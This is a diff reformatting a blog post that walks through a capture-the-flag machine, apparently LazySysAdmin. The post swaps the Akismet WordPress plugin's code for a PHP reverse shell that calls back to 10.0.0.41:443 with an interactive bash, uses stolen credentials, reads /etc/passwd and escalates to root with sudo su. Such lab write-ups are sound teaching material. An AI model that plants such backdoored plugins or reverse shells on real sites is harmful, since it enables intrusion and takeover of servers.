@@ -203,67 +203,68 @@ Armed with the password taken directly from the wp-config file, a successful log
 <p><center><img class="alignnone size-full wp-image-136" src="https://h4cklife.files.wordpress.com/2018/05/wp-admin_plugins.jpg" alt="wp-admin_plugins" width="1103" height="528" /></center> <em>wp-admin page is now accessible using stolen credentials</em>
 <p style="text-align:justify;">Below is a snippet of the modified &ldquo;Akismet Anti-Spam&rdquo;plugin. All of the plugin contents have been removed except for the header comments and the PHP tags themselves. Towards the bottom of the snippet you will see the beginning my <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">php-reverse-shell</a> code that replaced the original PHP plugin content:</p></p>
 
-<p><pre><code>/**
+<pre><code class="language-php">/**
 * @package Akismet
-<em>/
-/</em>
+*/
+/*
 Plugin Name: Akismet Anti-Spam
-Plugin URI: <a href="https://akismet.com/">https://akismet.com/</a>
+Plugin URI: https://akismet.com/
 Description: Used by millions, Akismet is quite possibly the best way in the world to protect your blog from spam. It keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key.
 Version: 3.3.3
 Author: Automattic
-Author URI: <a href="https://automattic.com/wordpress-plugins/">https://automattic.com/wordpress-plugins/</a>
+Author URI: https://automattic.com/wordpress-plugins/
 License: GPLv2 or later
 Text Domain: akismet
-*/</p>
+*/
 
-<p>/*
+/*
 This program is free software; you can redistribute it and/or
 modify it under the terms of the GNU General Public License
 as published by the Free Software Foundation; either version 2
-of the License, or (at your option) any later version.</p>
+of the License, or (at your option) any later version.
 
-<p>This program is distributed in the hope that it will be useful,
+This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-GNU General Public License for more details.</p>
+GNU General Public License for more details.
 
-<p>You should have received a copy of the GNU General Public License
+You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
-Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.</p>
+Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 
-<p>Copyright 2005-2015 Automattic, Inc.
-*/</p>
+Copyright 2005-2015 Automattic, Inc.
+*/
 
-<p>set_time_limit (0);
-$VERSION = &ldquo;1.0&rdquo;;
-<strong><span style="color:#ff6600;">$ip = &lsquo;10.0.0.41&rsquo;; // CHANGE THIS
-$port = 443; // CHANGE THIS</span></strong>
+set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = '10.0.0.41'; // CHANGE THIS
+$port = 443; // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = &lsquo;uname -a; w; id; /bin/<span style="color:#ff6600;"><strong>bash </strong></span>-i&rsquo;;
+$shell = 'uname -a; w; id; /bin/bash -i';
 $daemon = 0;
 $debug = 0;
 </code></pre>
-Once the shell code was added the plugin was reactivated and a reverse shell connection was received.</p>
 
-<p><center><img class="alignnone size-full wp-image-138" src="https://h4cklife.files.wordpress.com/2018/05/reverse_shell_connect.jpg" alt="reverse_shell_connect" width="920" height="327" /></center> Reverse  PHP Shell connection and bash tty shell spawned</p>
+<p>Once the shell code was added the plugin was reactivated and a reverse shell connection was received.</p>
+
+<p><center><img class="alignnone size-full wp-image-138" src="https://h4cklife.files.wordpress.com/2018/05/reverse_shell_connect.jpg" alt="reverse_shell_connect" width="920" height="327" /> Reverse  PHP Shell connection and bash tty shell spawned</center><br></p>
 
 <p>Now that a local connection has been established, the /etc/passwd file was read in order to see the local users on the target machine for possible attack trajectories to root.</p>
 
-<p><center><img class=" size-full wp-image-139 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/etc_passwd.jpg" alt="etc_passwd" width="603" height="188" /></center></p>
+<p><center><img class=" size-full wp-image-139 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/etc_passwd.jpg" alt="etc_passwd" width="603" height="188" /></center><br></p>
 
 <p>Next passwords that were enumerated earlier in the process are used to see if authentication to other users on the target machine is possible:</p>
 
-<p><center><img class="  wp-image-140 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/su_togie.jpg" alt="su_togie" width="374" height="128" /></center></p>
+<p><center><img class="  wp-image-140 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/su_togie.jpg" alt="su_togie" width="374" height="128" /></center><br></p>
 
 <p>Using the password enumerated from the deet.txt file during the SMB enumeration happened to be the login credentials for the user Togie!</p>
 
-<p><center><img class=" size-full wp-image-141 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/sudo_l.jpg" alt="sudo_l" width="828" height="235" /></center> sudo -l reveals user can run any command as root
+<p><center><img class=" size-full wp-image-141 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/sudo_l.jpg" alt="sudo_l" width="828" height="235" /> sudo -l reveals user can run any command as root</center><br>
 <p style="text-align:justify;">Immediately after logging in the sudo privileges for user Togie were checked revealing that this user has the ability to run <strong>ANY program</strong> on the machine as root! Upon seeing this we run &ldquo;sudo su,&rdquo; enter the password for Togie, and receive a command line now possessing root privileges!!</p></p>
 
-<p><center><img class="  wp-image-142 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/sudo_su.jpg" alt="sudo_su" width="359" height="82" /></center> user runs sudo su command and receives root privileges!</p>
+<p><center><img class="  wp-image-142 aligncenter" src="https://h4cklife.files.wordpress.com/2018/05/sudo_su.jpg" alt="sudo_su" width="359" height="82" /> <br>user runs sudo su command and receives root privileges!</center><br></p>
 
 <p>Below, the <strong>proof.txt</strong> was read from the /root/ directory validating that this machine has been exploited successfully:
 <pre><span style="color:#ff0000;"><strong>root@LazySysAdmin</strong></span>:/# cd /root
